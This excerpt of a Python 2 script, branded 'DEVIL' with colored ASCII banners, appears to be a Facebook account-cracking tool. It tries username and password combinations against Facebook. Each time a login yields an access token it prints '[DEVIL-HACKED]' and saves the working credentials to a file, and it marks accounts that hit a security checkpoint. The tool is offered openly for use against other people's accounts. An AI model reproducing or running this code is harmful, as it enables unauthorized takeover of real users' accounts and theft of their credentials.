#Tools Created By DEVIL 
#DEVIL Technology Channel
...
\033[0;92mooooooooo  ooooooooooo ooooo  oooo ooooo ooooo       
\033[0;95m888    88o 888    88   888    88   888   888        
\033[0;96m888    888 888ooo8      888  88    888   888        
\033[0;94m888    888 888    oo     88888     888   888      o 
\033[0;90mo888ooo88  o888ooo8888     888     o888o o888ooooo88 
                                                     
""")

print("\033[0;90mWELLCOME TO DEVIL WORLD ")
print("\033[0;91mThis Tool's Free By DEVIL ")
print("\033[0;92mDON'T COPY MY STYLE ")
...
def menu():
    ...
    print '\033[0;94mFACEBOOK PAGE : DEVIL.NAJMUL'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[DEVIL-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[DEVIL-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
